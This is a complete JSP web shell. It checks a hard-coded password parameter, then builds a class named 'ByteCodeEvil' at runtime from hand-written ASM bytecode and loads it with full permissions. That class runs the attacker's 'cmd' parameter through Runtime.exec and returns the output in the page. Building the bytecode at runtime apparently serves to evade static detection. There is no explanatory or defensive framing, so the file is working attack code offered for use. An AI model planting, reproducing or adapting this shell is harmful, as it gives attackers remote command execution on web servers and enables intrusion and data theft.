<%@ page language="java" pageEncoding="UTF-8" %>
<%@ page import="static jdk.internal.org.objectweb.asm.Opcodes.*" %>
<%
    String PASSWORD = "password";
    String passwd = request.getParameter("pwd");
    String cmd = request.getParameter("cmd");
    if (!passwd.equals(PASSWORD)) {
        return;
    }
    jdk.internal.org.objectweb.asm.ClassWriter classWriter = new jdk.internal.org.objectweb.asm.ClassWriter(
            jdk.internal.org.objectweb.asm.ClassWriter.COMPUTE_FRAMES);
    jdk.internal.org.objectweb.asm.FieldVisitor fieldVisitor;
    jdk.internal.org.objectweb.asm.MethodVisitor methodVisitor;
    classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, "sample/ByteCodeEvil", null, "java/lang/Object", null);
    fieldVisitor = classWriter.visitField(0, "res", "Ljava/lang/String;", null, null);
    fieldVisitor.visitEnd();
    methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "<init>", "(Ljava/lang/String;)V", null, new String[]{"java/io/IOException"});
    methodVisitor.visitCode();
    methodVisitor.visitVarInsn(ALOAD, 0);
    methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
    methodVisitor.visitTypeInsn(NEW, "java/lang/StringBuilder");
    methodVisitor.visitInsn(DUP);
    methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
    methodVisitor.visitVarInsn(ASTORE, 2);
    methodVisitor.visitTypeInsn(NEW, "java/io/BufferedReader");
    methodVisitor.visitInsn(DUP);
    methodVisitor.visitTypeInsn(NEW, "java/io/InputStreamReader");
    methodVisitor.visitInsn(DUP);
    methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
    methodVisitor.visitVarInsn(ALOAD, 1);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Process", "getInputStream", "()Ljava/io/InputStream;", false);
    methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/io/InputStreamReader", "<init>", "(Ljava/io/InputStream;)V", false);
    methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/io/BufferedReader", "<init>", "(Ljava/io/Reader;)V", false);
    methodVisitor.visitVarInsn(ASTORE, 3);
    jdk.internal.org.objectweb.asm.Label label0 = new jdk.internal.org.objectweb.asm.Label();
    methodVisitor.visitLabel(label0);
    methodVisitor.visitVarInsn(ALOAD, 3);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/BufferedReader", "readLine", "()Ljava/lang/String;", false);
    methodVisitor.visitInsn(DUP);
    methodVisitor.visitVarInsn(ASTORE, 4);
    jdk.internal.org.objectweb.asm.Label label1 = new jdk.internal.org.objectweb.asm.Label();
    methodVisitor.visitJumpInsn(IFNULL, label1);
    methodVisitor.visitVarInsn(ALOAD, 2);
    methodVisitor.visitVarInsn(ALOAD, 4);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
    methodVisitor.visitLdcInsn("\n");
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
    methodVisitor.visitInsn(POP);
    methodVisitor.visitJumpInsn(GOTO, label0);
    methodVisitor.visitLabel(label1);
    methodVisitor.visitVarInsn(ALOAD, 0);
    methodVisitor.visitVarInsn(ALOAD, 2);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
    methodVisitor.visitFieldInsn(PUTFIELD, "sample/ByteCodeEvil", "res", "Ljava/lang/String;");
    methodVisitor.visitInsn(RETURN);
    methodVisitor.visitMaxs(6, 5);
    methodVisitor.visitEnd();
    methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "toString", "()Ljava/lang/String;", null, null);
    methodVisitor.visitCode();
    methodVisitor.visitVarInsn(ALOAD, 0);
    methodVisitor.visitFieldInsn(GETFIELD, "sample/ByteCodeEvil", "res", "Ljava/lang/String;");
    methodVisitor.visitInsn(ARETURN);
    methodVisitor.visitMaxs(1, 1);
    methodVisitor.visitEnd();
    classWriter.visitEnd();
    final byte[] code = classWriter.toByteArray();
    ClassLoader loader = new ClassLoader() {
        @Override
        public Class<?> loadClass(String name) throws ClassNotFoundException {
            if(name.contains("ByteCodeEvil")){
                return findClass(name);
            }
            return super.loadClass(name);
        }

        @Override
        protected Class<?> findClass(String name) throws ClassNotFoundException {
            try {
                java.security.PermissionCollection pc = new java.security.Permissions();
                pc.add(new java.security.AllPermission());
                java.security.ProtectionDomain protectionDomain = new java.security.ProtectionDomain(
                        new java.security.CodeSource(null, (java.security.cert.Certificate[]) null), pc, this, null);
                return this.defineClass(name, code, 0, code.length, protectionDomain);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return super.findClass(name);
        }
    };
    Class<?> clazz = loader.loadClass("sample.ByteCodeEvil");
    java.lang.reflect.Constructor<?> constructor = clazz.getConstructor(String.class);
    String result = constructor.newInstance(cmd).toString();
    response.getWriter().print("<pre>");
    response.getWriter().print(result);
    response.getWriter().print("</pre>");
%>